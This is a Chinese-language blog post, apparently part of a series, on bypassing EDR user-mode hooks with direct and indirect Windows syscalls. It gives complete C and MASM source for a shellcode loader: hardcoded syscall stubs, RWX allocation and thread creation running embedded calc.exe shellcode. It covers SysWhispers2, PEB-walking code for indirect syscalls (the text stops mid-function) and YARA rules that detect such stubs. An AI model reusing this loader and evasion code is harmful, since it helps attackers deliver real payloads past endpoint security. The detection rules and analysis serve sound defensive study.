<p>有了目标函数的 SSN，我们便可以用汇编代码实现 NTAPI 并进行调用了。这里，我们将先讨论直接调用 syscall。我们以经典的 VirtualAlloc + WriteProcessMemory(或者是其他复制数据的函数) + CreateThread + WaitForSingleObject 的代码执行方法为例，当然了，我们使用的是这些 API 的 NTAPI 版本，执行 calc 的 shellcode。</p>
<h4 id="直接-syscall">
  <strong>直接 syscall</strong>
  <a class="anchor" href="#%e7%9b%b4%e6%8e%a5-syscall">#</a>
</h4>
<p>在 C 源代码文件里定义 NtAllocateVirtualMemory 函数以及所需的结构体(尽管该 NTAPI 没有所需的结构体)，而在 asm 文件里用汇编代码实现函数功能，这里我们实现 NtAllocateVirtualMemory 的 syscall stub 即可。 <strong>EXTERN_C 宏</strong>允许链接器将该函数定义与汇编代码链接起来，需要保持名称相同。这样，我们就能像调用一般函数一样调用定义的汇编函数了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtAllocateVirtualMemory</span>(
</span></span><span style="display:flex;"><span> IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span> IN OUT PVOID<span style="color:#f92672">*</span> BaseAddress,
</span></span><span style="display:flex;"><span> IN ULONG ZeroBits,
</span></span><span style="display:flex;"><span> IN OUT PSIZE_T RegionSize,
</span></span><span style="display:flex;"><span> IN ULONG AllocationType,
</span></span><span style="display:flex;"><span> IN ULONG Protect);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.code
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>...SNIP...<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtAllocateVirtualMemory PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">18</span>h
</span></span><span style="display:flex;"><span>    syscall
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtAllocateVirtualMemory ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>...SNIP...<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>end
</span></span></code></pre></div><p>以此类推，我们接着去定义其他所需的函数，例如 NtWriteVirtualMemory，NtCreateThreadEx，NtWaitForSingleObject，NtClose 等。因为这些 NTAPI 大都没有微软官方的文档，因此我们需要借助搜索引擎参考已有项目对其的用法。完成后的代码如下：</p>
<p><strong>DirectSyscall.c</strong> 代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _PS_ATTRIBUTE
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> ULONG  Attribute;
</span></span><span style="display:flex;"><span> SIZE_T Size;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">union</span>
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  ULONG Value;
</span></span><span style="display:flex;"><span>  PVOID ValuePtr;
</span></span><span style="display:flex;"><span> } u1;
</span></span><span style="display:flex;"><span> PSIZE_T ReturnLength;
</span></span><span style="display:flex;"><span>} PS_ATTRIBUTE, <span style="color:#f92672">*</span> PPS_ATTRIBUTE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _UNICODE_STRING
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> USHORT Length;
</span></span><span style="display:flex;"><span> USHORT MaximumLength;
</span></span><span style="display:flex;"><span> PWSTR  Buffer;
</span></span><span style="display:flex;"><span>} UNICODE_STRING, <span style="color:#f92672">*</span> PUNICODE_STRING;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _OBJECT_ATTRIBUTES
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> ULONG           Length;
</span></span><span style="display:flex;"><span> HANDLE          RootDirectory;
</span></span><span style="display:flex;"><span> PUNICODE_STRING ObjectName;
</span></span><span style="display:flex;"><span> ULONG           Attributes;
</span></span><span style="display:flex;"><span> PVOID           SecurityDescriptor;
</span></span><span style="display:flex;"><span> PVOID           SecurityQualityOfService;
</span></span><span style="display:flex;"><span>} OBJECT_ATTRIBUTES, <span style="color:#f92672">*</span> POBJECT_ATTRIBUTES;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _PS_ATTRIBUTE_LIST
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> SIZE_T       TotalLength;
</span></span><span style="display:flex;"><span> PS_ATTRIBUTE Attributes[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>} PS_ATTRIBUTE_LIST, <span style="color:#f92672">*</span> PPS_ATTRIBUTE_LIST;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtAllocateVirtualMemory</span>(
</span></span><span style="display:flex;"><span> IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span> IN OUT PVOID<span style="color:#f92672">*</span> BaseAddress,
</span></span><span style="display:flex;"><span> IN ULONG ZeroBits,
</span></span><span style="display:flex;"><span> IN OUT PSIZE_T RegionSize,
</span></span><span style="display:flex;"><span> IN ULONG AllocationType,
</span></span><span style="display:flex;"><span> IN ULONG Protect);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtWriteVirtualMemory</span>(
</span></span><span style="display:flex;"><span> IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span> IN PVOID BaseAddress,
</span></span><span style="display:flex;"><span> IN PVOID Buffer,
</span></span><span style="display:flex;"><span> IN SIZE_T NumberOfBytesToWrite,
</span></span><span style="display:flex;"><span> OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtCreateThreadEx</span>(
</span></span><span style="display:flex;"><span> OUT PHANDLE ThreadHandle,
</span></span><span style="display:flex;"><span> IN ACCESS_MASK DesiredAccess,
</span></span><span style="display:flex;"><span> IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
</span></span><span style="display:flex;"><span> IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span> IN PVOID StartRoutine,
</span></span><span style="display:flex;"><span> IN PVOID Argument OPTIONAL,
</span></span><span style="display:flex;"><span> IN ULONG CreateFlags,
</span></span><span style="display:flex;"><span> IN SIZE_T ZeroBits,
</span></span><span style="display:flex;"><span> IN SIZE_T StackSize,
</span></span><span style="display:flex;"><span> IN SIZE_T MaximumStackSize,
</span></span><span style="display:flex;"><span> IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtWaitForSingleObject</span>(
</span></span><span style="display:flex;"><span> IN HANDLE ObjectHandle,
</span></span><span style="display:flex;"><span> IN BOOLEAN Alertable,
</span></span><span style="display:flex;"><span> IN PLARGE_INTEGER TimeOut OPTIONAL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtClose</span>(
</span></span><span style="display:flex;"><span> IN HANDLE Handle);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// calc.exe shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x28\xff\xd0</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    LPVOID allocation_start;
</span></span><span style="display:flex;"><span>    SIZE_T allocation_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(code);
</span></span><span style="display:flex;"><span>    HANDLE hThread;
</span></span><span style="display:flex;"><span>    NTSTATUS status;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    allocation_start <span style="color:#f92672">=</span> nullptr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate Virtual Memory 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">NtAllocateVirtualMemory</span>(<span style="color:#a6e22e">GetCurrentProcess</span>(), <span style="color:#f92672">&amp;</span>allocation_start, <span style="color:#ae81ff">0</span>, (PULONG64)<span style="color:#f92672">&amp;</span>allocation_size, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Memory allocated at %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, allocation_start);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Allocated failed, Error code is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy shellcode into allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">NtWriteVirtualMemory</span>(<span style="color:#a6e22e">GetCurrentProcess</span>(), allocation_start, code, <span style="color:#66d9ef">sizeof</span>(code), <span style="color:#ae81ff">0</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Copied successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Copied failed, Error code is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">NtCreateThreadEx</span>(<span style="color:#f92672">&amp;</span>hThread, GENERIC_EXECUTE, NULL, <span style="color:#a6e22e">GetCurrentProcess</span>(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Executed successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Executed failed, Error code is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Wait for the end of the thread and close the handle
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">NtWaitForSingleObject</span>(hThread, FALSE, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">NtClose</span>(hThread);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>stub.asm</strong> 代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.code
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtAllocateVirtualMemory PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">18</span>h
</span></span><span style="display:flex;"><span>    syscall
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtAllocateVirtualMemory ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtWriteVirtualMemory PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">3</span>Ah
</span></span><span style="display:flex;"><span>    syscall
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtWriteVirtualMemory ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtCreateThreadEx PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">0</span>C2h
</span></span><span style="display:flex;"><span>    syscall
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtCreateThreadEx ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtWaitForSingleObject PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    syscall
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtWaitForSingleObject ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtClose PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">0F</span>h
</span></span><span style="display:flex;"><span>    syscall
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtClose ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>end
</span></span></code></pre></div><p>为了能编译 masm 文件，我们右键项目，选择 <strong>Build Dependencies -&gt; Build Customizations</strong>，勾选 <strong>masm</strong>。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155802.png" alt="20240324155802" /></p>
<p>右键 asm 代码文件选择属性，<strong>General -&gt; Item Type</strong> 选项选择 <strong>Microsoft Macro Assembler</strong>。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155811.png" alt="20240324155811" /></p>
<p>这样我们便能编译项目里的 masm 代码了。编译后运行程序，我们发现 shellcode 得以成功运行。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155821.png" alt="20240324155821" /></p>
<p>不过直接 syscall 调用的弊端也是比较显著的，汇编函数在编译后成为操作码存在于程序的代码区，汇编代码与操作码是可预测的一一对应的关系。因此，如果没有对 syscall stub 进行混淆的话，我们可以用如下 yara 规则来检测包含直接 syscall 调用的程序：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">rule direct_syscall</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">meta</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">description = &#34;Hunt for direct syscall&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">strings</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$s1 = {4c 8b d1 48 c7 c0 ?? ?? ?? ?? 0f 05 c3}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$s2 = {4C 8b d1 b8 ?? ?? ?? ?? 0F 05 C3}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">condition</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#s1 &gt;=1 or #s2 &gt;=1</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>我们定义了 5 个 syscall stub，都被检测到了。我们可以插入一些 <strong>NOP</strong> 类(即无实际意义、不影响运行结果) 的指令用于混淆 syscall stub。但即便有混淆，0xf 0x5(syscall) 指令始终存在于代码区，这是可疑的。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155833.png" alt="20240324155833" /></p>
<p>此外，从调用栈的视角，是我们程序的某一函数发起了 syscall，而不是 ntdll 空间内的 NTAPI，这是非常可疑的。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155841.png" alt="20240324155841" /></p>
<h4 id="syswhisper-1amp2">
  <strong>syswhisper 1&amp;2</strong>
  <a class="anchor" href="#syswhisper-1amp2">#</a>
</h4>
<p>Syswhisper 1 和 2 可以自动地帮我们生成 C 项目的头文件以及 asm 文件，方便我们发起直接 syscall。Syswhisper 1 是通过检查操作系统的版本从而确定给定 NTAPI 的 SSN，这算是硬编码了，不够灵活。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155852.png" alt="20240324155852" /></p>
<p>syswhisper 2 将所有 <strong>Zw</strong> 开头的函数按照地址排序存储进数组里，<strong>SSN</strong> 与<strong>函数地址高低</strong>是正相关，因此，要寻找的函数的 SSN 即为该函数地址在数组里的索引。</p>
<p>至于为什么以 Zw 开头，因为其实 NTAPI 的 NT 与 ZW 版本指向同一地址。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155905.png" alt="20240324155905" /></p>
<p>使用 syswhisper 2 的 python 脚本生成所需的<strong>头文件，c 文件</strong>以及 <strong>asm 文件</strong>，可以生成所有的 NTAPI 的相关代码，也可以只生成指定或常用的 NTAPI 的。</p>
<p>因为有 asm 文件，所以我们依旧需要启用 masm。把生成的<strong>头文件</strong>加入到 <strong>Header Files</strong> 中，<strong>c 文件</strong>与 <strong>asm 文件</strong>添加至 <strong>Source Files</strong> 中。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155948.png" alt="20240324155948" /></p>
<p>对于主函数的代码，我们可以复用之前的，但别忘了添加 syswhisper2 生成的头文件。就这样，我们也成功执行了 shellcode。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160007.png" alt="20240324160007" /></p>
<p>我们可以根据 asm 文件中的 WhisperMain 函数代码创建 yara 规则。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160021.png" alt="20240324160021" /></p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160038.png" alt="20240324160038" /></p>
<p>样本规则如下所示：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">rule syswhisper2</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">meta</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">description = &#34;Hunt for syswhisper2 generated asm code&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">strings</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$s1 = {58 48 89 4C 24 08 48 89 54 24 10 4C 89 44 24 18 4C 89 4C 24 20 48 83 EC 28 8B 0D ?? ?? 00 00 E8 ?? ?? ?? ?? 48 83 C4 28 48 8B 4C 24 08 48 8B 54 24 10 4C 8B 44 24 18 4C 8B 4C 24 20 4C 8B D1 0F 05 C3}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">condition</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#s1 &gt;=1 </span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这样，我们用 yara 检测到了使用 syswhisper2 的程序。当然了，可以对该函数进行混淆，不过调用栈的嫌疑也很大。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160102.png" alt="20240324160102" /></p>
<h3 id="间接调用-syscall">
  <strong>间接调用 Syscall</strong>
  <a class="anchor" href="#%e9%97%b4%e6%8e%a5%e8%b0%83%e7%94%a8-syscall">#</a>
</h3>
<p>因为直接 syscall 在调用栈上有着难以掩盖的检测点，间接调用 syscall 应运而生。间接调用 syscall 这个分类下其实也衍生出了多种方法，也包括我近期提出的 MutationGate。</p>
<h4 id="间接-syscall">
  <strong>间接 syscall</strong>
  <a class="anchor" href="#%e9%97%b4%e6%8e%a5-syscall">#</a>
</h4>
<p>间接 syscall 的宗旨是与其直接在程序内执行 syscall 指令，不如在 <strong>ntdll 模块里</strong>寻找一条 syscall 指令，记录其地址，并在项目中用汇编代码定义的 syscall stub 中，将原本的 <strong>syscall 指令</strong>替换为 <strong>jmp &lt;syscall 地址&gt;</strong> 指令。如下所示：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NtAllocateVirtualMemory PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov eax, (ssn of NtAllocateVirtualMemory)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> (address of a syscall instruction)
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtAllocateVirtualMemory ENDP
</span></span></code></pre></div><p>我们可以用如下代码获得给定 NTAPI 的 syscall 指令的地址。不过，从<strong>函数调用成功</strong>的角度来看，我们其实不是非得要获得目标 NTAPI 的 syscall 指令的地址。syscall 是一种特殊的 call 指令，根据 RAX/EAX 的值来确定内核层的对应函数，而非 syscall 指令所在的地址。也就是说，如果我们能在其他 DLL 中找到 syscall 指令，也是可以用的。如果我们刻意地选用良性 NTAPI 的 syscall 指令而非目标 NTAPI 的，可能会带来规避上的优势，但也可能适得其反，这取决于 EDR 的检测逻辑。毕竟，在内核层从<strong>调用栈</strong>或<strong>返回地址</strong>的角度是可以看出端倪的。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//Get module handle for ntdll and kernel32 at the same time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GetModule</span>(HMODULE<span style="color:#f92672">*</span> ntdll, HMODULE<span style="color:#f92672">*</span> kernel32)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PPEB peb <span style="color:#f92672">=</span> (PPEB)(__readgsqword(<span style="color:#ae81ff">0x60</span>));
</span></span><span style="display:flex;"><span> PPEB_LDR_DATA ldr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PPEB_LDR_DATA<span style="color:#f92672">*</span>)((PBYTE)peb <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>); <span style="color:#75715e">//PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PLIST_ENTRY ntdlllistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ldr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>ntdll <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernelbaselistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernel32listentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)kernelbaselistentry);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>kernel32 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)kernel32listentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PBYTE <span style="color:#a6e22e">GetSyscallAddr</span>(IN HMODULE hModule, <span style="color:#66d9ef">const</span> CHAR<span style="color:#f92672">*</span> funcName)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PBYTE pBase <span style="color:#f92672">=</span> (PBYTE)hModule;
</span></span><span style="display:flex;"><span> PBYTE syscall;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgDosHdr<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgNtHdrs<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> IMAGE_OPTIONAL_HEADER ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
